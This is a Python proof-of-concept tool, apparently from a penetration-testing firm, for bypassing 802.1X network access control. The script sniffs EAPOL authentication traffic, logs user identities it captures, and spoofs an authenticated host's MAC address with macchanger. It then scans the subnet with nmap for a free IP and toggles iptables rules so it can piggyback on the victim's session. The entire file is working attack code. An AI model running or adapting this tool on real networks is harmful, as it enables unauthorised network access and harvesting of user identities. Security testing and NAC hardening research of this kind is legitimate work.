import subprocess
import nmap
import random
import os
from datetime import datetime
import time

##########################################################################
# ISESkating was made by marantral infiltration.jedi@gmail.com           #
# with Abricto Security abrictosecurity.com. This is a POC for           #
# riding NAC authentication. If you want to run this as a service        #
# you will need to copy the iseskate.service to the /etc/systemd/system/ #
# then enable it on boot. This POC has been tested on Unbuntu and Debian #
# based operating systems.                                               #
# Here you will just need to set the interface that you want to use.     #
##########################################################################

face = "eth0" # Change to the target interface that has NAC that you are trying to bypass.

try:
    os.makedirs("/usr/share/iseskate/")
except OSError:
    pass

try:
    os.makedirs("/usr/share/iseskate/LAN/")
except OSError:
    pass

try:
    os.makedirs("/usr/share/iseskate/EAP/")
except OSError:
    pass

try:
    os.makedirs("/usr/share/iseskate/PCAP/")
except OSError:
    pass

try:
    os.makedirs("/usr/share/iseskate/PCAP/IP/")
except OSError:
    pass

lanf = "/usr/share/iseskate/LAN/"
eapf = "/usr/share/iseskate/EAP/"
pcapf = "/usr/share/iseskate/PCAP/"
ipf = pcapf + "IP/"


# Blocking outbound traffic
def iptables_add():
    drop_out = "iptables -A OUTPUT -o eth0 -j DROP"
    drop_for = "iptables -A FORWARD -o eth0 -j DROP"
    subprocess.call(drop_out, shell=True)
    subprocess.call(drop_for, shell=True)


# Removing outbound traffic blocks
def iptables_del():
    remove_out = "iptables -F OUTPUT"
    remove_for = "iptables -F FORWARD"
    subprocess.call(remove_out, shell=True)
    subprocess.call(remove_for, shell=True)


# Change MAC and add routes
def mac_route(mac):
    macs = "ifconfig " + face + " down; macchanger --mac=" + mac + " " + face + "; ifconfig " + face + " up"
    subprocess.call(macs, shell=True)


# Scanning for unused IPs and adding it to interface
def ip_add(net, tip):
    try:
        clean = "rm " + lanf + "*.txt"
        subprocess.call(clean, shell=True)
    except:
        pass

    set_temp = "ifconfig " + face + " " + tip + " netmask 255.255.255.0"
    subprocess.call(set_temp, shell=True)

    nmap_scan = nmap.PortScanner()

    nmap_args = "-sn -T4 -oG " + lanf + ".pingscan.txt"
    nmap_scan.scan(hosts=net, arguments=nmap_args)

    up_hosts = "cat " + lanf + ".pingscan.txt | grep 'Up' | cut -d ' ' -f 2 | sort | uniq > " + lanf + "uphosts.txt"
    subprocess.call(up_hosts, shell=True)

    while True:
        toct = "cat " + lanf + "uphosts.txt | cut -d '.' -f 1,2,3 | uniq >> " + lanf + "net.txt"
        subprocess.call(toct, shell=True)
        qad = open(lanf + "net.txt", "r")
        lines = [i for i in qad.readlines() if len(i) > 0]
        if len(lines) == 253:
            break
    dot = "awk '{print $0\".\"}' " + lanf + "net.txt > " + lanf + "net1.txt"
    subprocess.call(dot, shell=True)
    number = r"awk -F '\n' '{print $0 NR}' " + lanf + "net1.txt > " + lanf + "net2.txt"
    subprocess.call(number, shell=True)

    poc = open(lanf + "net2.txt", "r")

    hosts = open(lanf + "uphosts.txt", "r")
    ip = []
    for f in hosts:
        current_place = f[:-1]
        ip.append(current_place)

    pos = []
    for f in poc:
        current_place = f[:-1]
        pos.append(current_place)

    uips = set(pos) - set(ip)
    diff = list(uips)

    set_ip = random.choice(diff)

    main_ip = "ifconfig " + face +" " + set_ip + " netmask 255.255.255.0"
    subprocess.call(main_ip, shell=True)


# Packet EAP Capture
def eap_capture():
    tcc = "tcpdump -i " + face + " -c 2 -e ether proto '0x888e' -tttt -v  > " + eapf + ".eapcap.txt"
    subprocess.call(tcc, shell=True)
    tcc1 = "cat " + eapf + ".eapcap.txt  >> " + eapf + ".eap.txt"
    subprocess.call(tcc1, shell=True)

    eaps = "cat " + eapf + ".eap.txt | grep 'EAPOL start' > " + eapf + "EAPOL_START.txt"
    subprocess.call(eaps, shell=True)
    user = "cat " + eapf + ".eap.txt | grep 'Identity:' >> " + pcapf  + "EAPOL_users.txt"
    subprocess.call(user, shell=True)

def eap_check():
    try:
        tcc = "tcpdump -i " + face + " -c 2 -e ether proto '0x888e' -tttt -v > " + eapf + ".eapcheck.txt"
        subprocess.call(tcc, shell=True, timeout=70)
    except:
        pass
    tcc1 = "cat " + eapf + ".eapcheck.txt  >> " + eapf + ".eap.txt"
    subprocess.call(tcc1, shell=True)


# Identifying IP
def ip_capture(mac):
    clean = "rm " + ipf + "*.txt"
    subprocess.call(clean, shell=True)

    while True:
        collect_ip = "tcpdump -i " + face + " -c 10 ether src " + mac + " -n  > " + ipf + "tcp.txt"
        subprocess.call(collect_ip, shell=True)

        clean_ip = "cat " + ipf + "tcp.txt | grep ' IP ' | egrep -v '0.0.0.0' | egrep -v '169.254.' | cut -d '.' -f 2,3,4,5 | cut -d ' ' -f 3 | uniq >" + ipf + "hostip.txt "
        subprocess.call(clean_ip, shell=True)

        if os.stat(ipf + "hostip.txt").st_size != 0:
            break


def main():
    try:
        clean = "rm " + eapf + ".eap.txt"
        subprocess.call(clean, shell=True)
    except:
        pass
    try:
        clean = "rm " + eapf + ".t_time"
        subprocess.call(clean, shell=True)
    except:
        pass
    try:
        clean = "rm " + eapf + ".mac"
        subprocess.call(clean, shell=True)
    except:
        pass

    iptables_add()

    while True:

        start_over = ""
        eap_capture()

        if os.path.exists(eapf + ".eap.txt"):
            with open(eapf + '.eap.txt', 'r') as eap:
                lines = eap.readlines()
            for line in lines:
                if 'EAPOL start' in line:
                    mac_get = "cat " + eapf + '.eap.txt | grep "EAPOL start" | cut -d " " -f 3 | uniq > ' + eapf + ".mac"
                    subprocess.call(mac_get, shell=True)

                    with open(eapf + ".mac", "r") as file:
                        mac = file.read().strip()

                    ip_capture(mac)
                    mac_route(mac)

                    with open(ipf + "hostip.txt", "r") as file:
                        tip = file.read().strip()

                    net_get = "awk -F\".\" '{print $1\".\"$2\".\"$3\".0/24\"}' <" + ipf + "hostip.txt >" + ipf + "net.txt"
                    subprocess.call(net_get, shell=True)

                    with open(ipf + "net.txt", "r") as file:
                        net = file.read().strip()

                    ip_add(net, tip)
                    iptables_del()
                    while True:
                        eap_capture()
                        time_file = "cat " + eapf + ".eap.txt | cut -d ' ' -f 1,2 | cut -d ':' -f 1,2 | egrep -v 'Type' | uniq > " + eapf + ".t_time"
                        subprocess.call(time_file, shell=True)
                        times1 = open(eapf + ".t_time", "r")
                        lines = [i for i in times1.readlines() if len(i) > 0]
                        if len(lines) >= 2:
                            with open(eapf + ".t_time", "r") as f:
                                target1 = 0
                                target2 = 1
                                for i, line in enumerate(f):
                                    if i == target1:
                                        time1 = line.strip()

                                    if i == target2:
                                        time2 = line.strip()

                            break

                    time_one = datetime.fromisoformat(time1)
                    time_two = datetime.fromisoformat(time2)

                    compare_time = (time_two - time_one)
                    start_time = time.time()
                    seconds = compare_time.total_seconds() - 10

                    control = 4

                    while True:

                        current_time = time.time()
                        e_time = current_time - start_time

                        if e_time > seconds:
                            control += 2
                            eap_check()
                            time_file = "cat " + eapf + ".eap.txt | cut -d ' ' -f 1,2 | cut -d ':' -f 1,2,3 | egrep -v 'Type' | uniq > " + eapf + ".time"
                            subprocess.call(time_file, shell=True)

                            checkfile = open(eapf + ".eapcheck.txt", "r")
                            if 'Failure' in checkfile.read():
                                start_over == "5"
                                break

                            check = open(eapf + ".time", "r")
                            lines = [i for i in check.readlines() if len(i) > 0]
                            if len(lines) != control:
                                clean = "rm " + eapf + ".eap.txt"
                                subprocess.call(clean, shell=True)
                                clean1 = "rm " + eapf + ".t_time"
                                subprocess.call(clean1, shell=True)
                                clean2 = "rm " + eapf + ".mac"
                                subprocess.call(clean2, shell=True)
                                iptables_add()
                                start_over = "5"
                                break
                            if start_over == "5":
                                break
                            else:
                                start_time = time.time()
                        if start_over == "5":
                            break
                if start_over == "5":
                    break


if __name__ == '__main__':
    main()
